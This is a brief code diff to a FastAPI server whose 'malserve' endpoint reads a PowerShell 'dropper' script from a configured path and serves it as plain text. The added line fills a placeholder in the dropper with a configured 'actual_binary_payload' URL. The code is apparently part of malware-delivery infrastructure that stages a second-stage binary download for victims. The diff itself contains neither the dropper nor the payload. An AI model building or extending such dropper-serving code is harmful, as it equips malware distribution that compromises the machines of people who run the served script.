@@ -13,6 +13,7 @@ app = FastAPI()
 def malserve():
     with open(config.conf["PATHS"]["dropper"],"r",encoding="utf-8") as powershellscript:
         PSCode = powershellscript.read()
+    PSCode = PSCode.replace("{{Binary Payload URL}}",config.conf["URLS"]["actual_binary_payload"])
     return Response(
         content=PSCode,
         media_type="text/plain"
